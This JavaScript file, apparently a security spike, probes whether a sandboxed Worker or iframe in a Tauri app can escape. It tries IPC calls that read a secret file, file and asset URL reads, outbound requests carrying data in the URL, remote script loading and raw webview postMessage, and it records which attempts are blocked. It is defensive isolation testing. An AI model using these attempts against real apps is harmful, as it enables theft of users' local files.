// Spike F: everything a hostile add-on would try. Runs inside a Worker or a sandboxed iframe.
// Returns a plain object: what exists, and what each attempt got back.
self.runAttacks = async function (secretPath, where) {
  const out = {};
  const g = self;
  out.origin = String(g.origin);
  out["typeof __TAURI_INTERNALS__"] = typeof g.__TAURI_INTERNALS__;
  out["typeof __TAURI__"] = typeof g.__TAURI__;
  out["typeof ipc"] = typeof g.ipc;
  out["typeof chrome.webview"] = typeof (g.chrome && g.chrome.webview);
  out["typeof webkit.messageHandlers"] = typeof (g.webkit && g.webkit.messageHandlers);
  const short = (s) => String(s).replace(/\s+/g, " ").slice(0, 140);
  const tfetch = (u, o = {}) => {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 3000);
    return fetch(u, { ...o, signal: c.signal }).finally(() => clearTimeout(t));
  };
  const headers = { "Content-Type": "application/json", "Tauri-Callback": "1", "Tauri-Error": "2" };
  const calls = [
    ["canary", { from: where }],
    ["plugin%3Afs%7Cread_file", { path: secretPath }],
  ];
  const tick = (at) => typeof document !== "undefined" && parent.postMessage({ type: "progress", at }, "*");
  for (const base of ["ipc://localhost/", "http://ipc.localhost/"]) {
    for (const [cmd, body] of calls) {
      tick(base + cmd);
      try {
        const r = await tfetch(base + cmd, { method: "POST", body: JSON.stringify(body), headers });
        const t = await r.text();
        out["fetch " + base + cmd] = "status " + r.status + (t.includes("SECRET") || t.includes("83,69,67") ? " LEAK" : "") + ": " + short(t);
      } catch (e) {
        out["fetch " + base + cmd] = "blocked: " + short(e);
      }
    }
  }
  const enc = encodeURIComponent(secretPath);
  for (const u of ["https://example.com/", "file://" + secretPath, "asset://localhost/" + enc, "http://asset.localhost/" + enc]) {
    tick(u.slice(0, 40));
    try {
      const r = await tfetch(u);
      const t = await r.text();
      out["fetch " + u.slice(0, 40)] = "status " + r.status + (t.includes("SECRET") ? " LEAK" : "");
    } catch (e) {
      out["fetch " + u.slice(0, 40)] = "blocked: " + short(e);
    }
  }
  // no-cors: an opaque answer means the request LEFT the machine (data could ride in the URL); an error
  // means it was stopped before sending (CSP) or the network failed.
  tick("no-cors");
  try {
    const r = await tfetch("https://example.com/?spike-f=" + where, { mode: "no-cors" });
    out["no-cors https request"] = "SENT (opaque, type " + r.type + ")";
  } catch (e) {
    out["no-cors https request"] = "blocked: " + short(e);
  }
  tick("websocket");
  out["websocket"] = await new Promise((res) => {
    try {
      const ws = new WebSocket("wss://echo.websocket.org/");
      const t = setTimeout(() => res("no answer in 3 s"), 3000);
      ws.onopen = () => (clearTimeout(t), ws.close(), res("OPEN"));
      ws.onerror = () => (clearTimeout(t), res("error (blocked or failed)"));
    } catch (e) {
      res("blocked: " + short(e));
    }
  });
  if (typeof importScripts === "function") {
    try {
      importScripts("https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js");
      out["importScripts remote"] = "LOADED, typeof _ = " + typeof self._;
    } catch (e) {
      out["importScripts remote"] = "blocked: " + short(e);
    }
  }
  if (typeof document === "undefined") try {
    const x = new XMLHttpRequest();
    x.open("POST", "ipc://localhost/canary", false);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({ from: where + "/xhr" }));
    out["sync xhr ipc"] = "status " + x.status;
  } catch (e) {
    out["sync xhr ipc"] = "blocked: " + short(e);
  }
  tick("internals");
  if (g.__TAURI_INTERNALS__ && g.__TAURI_INTERNALS__.invoke) {
    try {
      out["internals.invoke canary"] = short(await g.__TAURI_INTERNALS__.invoke("canary", { from: where + "/internals" }));
    } catch (e) {
      out["internals.invoke canary"] = "refused: " + short(e);
    }
    try {
      const b = await g.__TAURI_INTERNALS__.invoke("plugin:fs|read_file", { path: secretPath });
      out["internals.invoke fs"] = "GOT " + short(b);
    } catch (e) {
      out["internals.invoke fs"] = "refused: " + short(e);
    }
  }
  tick("raw postMessage");
  const raw = JSON.stringify({ cmd: "canary", callback: 1, error: 2, payload: { from: where + "/raw" } });
  try {
    if (g.chrome && g.chrome.webview) {
      g.chrome.webview.postMessage(raw);
      out["chrome.webview.postMessage"] = "sent";
    }
  } catch (e) {
    out["chrome.webview.postMessage"] = "blocked: " + short(e);
  }
  try {
    if (g.webkit && g.webkit.messageHandlers && g.webkit.messageHandlers.ipc) {
      g.webkit.messageHandlers.ipc.postMessage(raw);
      out["webkit ipc postMessage"] = "sent";
    }
  } catch (e) {
    out["webkit ipc postMessage"] = "blocked: " + short(e);
  }
  try {
    out["parent reachable"] = g.parent && g.parent !== g ? typeof g.parent.__TAURI_INTERNALS__ : "n/a";
  } catch (e) {
    out["parent reachable"] = "blocked: " + short(e);
  }
  return out;
};
